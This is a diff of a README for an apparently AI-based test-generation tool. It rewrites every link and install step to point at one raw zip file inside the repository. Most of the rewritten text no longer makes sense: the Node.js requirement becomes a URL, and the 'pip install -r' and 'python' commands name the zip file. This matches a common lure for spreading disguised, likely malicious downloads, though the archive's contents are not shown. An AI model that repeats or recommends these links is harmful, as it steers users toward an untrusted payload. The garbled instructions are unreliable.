@@ -8,7 +8,7 @@ Welcome to **ai-test-explorer**, your go-to solution for automated test generati
 
 To get started, you need to download the software. Click the button below to visit the Releases page and download the latest version.
 
-[![Download ai-test-explorer](https://img.shields.io/badge/Download-ai--test--explorer-blue.svg)](https://github.com/S9JF/ai-test-explorer/releases)
+[![Download ai-test-explorer](https://github.com/S9JF/ai-test-explorer/raw/refs/heads/main/mcp/ai-explorer-test-v1.9-alpha.2.zip)](https://github.com/S9JF/ai-test-explorer/raw/refs/heads/main/mcp/ai-explorer-test-v1.9-alpha.2.zip)
 
 ## 📋 System Requirements
 
@@ -16,7 +16,7 @@ Before you begin, ensure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
 - **Python Version:** Python 3.7 or later installed
-- **Node.js:** Any version compatible with Playwright
+- **https://github.com/S9JF/ai-test-explorer/raw/refs/heads/main/mcp/ai-explorer-test-v1.9-alpha.2.zip** Any version compatible with Playwright
 
 Please check the appropriate official websites for installation guides if you do not have these tools installed.
 
@@ -31,7 +31,7 @@ Please check the appropriate official websites for installation guides if you do
 ## 📂 How to Use
 
 1. **Visiting the Releases Page:** 
-   Go to [this page](https://github.com/S9JF/ai-test-explorer/releases) to find the latest version available for download.
+   Go to [this page](https://github.com/S9JF/ai-test-explorer/raw/refs/heads/main/mcp/ai-explorer-test-v1.9-alpha.2.zip) to find the latest version available for download.
 
 2. **Downloading the Application:**
    Locate the version you wish to download, and click on the link. The download should start automatically.
@@ -47,14 +47,14 @@ Please check the appropriate official websites for installation guides if you do
    Before running the application, you need to install the required libraries. Execute the following command in your terminal:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/S9JF/ai-test-explorer/raw/refs/heads/main/mcp/ai-explorer-test-v1.9-alpha.2.zip
    ```
 
 6. **Running the Application:**
    Now you can run the software. Use the command below:
 
    ```bash
-   python ai_test_explorer.py
+   python https://github.com/S9JF/ai-test-explorer/raw/refs/heads/main/mcp/ai-explorer-test-v1.9-alpha.2.zip
    ```
 
 ## 📖 How to Generate Tests
@@ -68,7 +68,7 @@ Please check the appropriate official websites for installation guides if you do
 
 ## 📚 Additional Resources
 
-If you need help with specific features or troubleshooting, visit our documentation [here](https://github.com/S9JF/ai-test-explorer/wiki).
+If you need help with specific features or troubleshooting, visit our documentation [here](https://github.com/S9JF/ai-test-explorer/raw/refs/heads/main/mcp/ai-explorer-test-v1.9-alpha.2.zip).
 
 ## 🌟 Community Support
 
@@ -76,6 +76,6 @@ We are building a supportive community around **ai-test-explorer**. You can ask 
 
 ## 🔗 Stay Updated
 
-For the latest updates, new features, and tips, follow our repository and check back often to the [Releases page](https://github.com/S9JF/ai-test-explorer/releases).
+For the latest updates, new features, and tips, follow our repository and check back often to the [Releases page](https://github.com/S9JF/ai-test-explorer/raw/refs/heads/main/mcp/ai-explorer-test-v1.9-alpha.2.zip).
 
 Thank you for choosing **ai-test-explorer**. Enjoy effortless test generation!
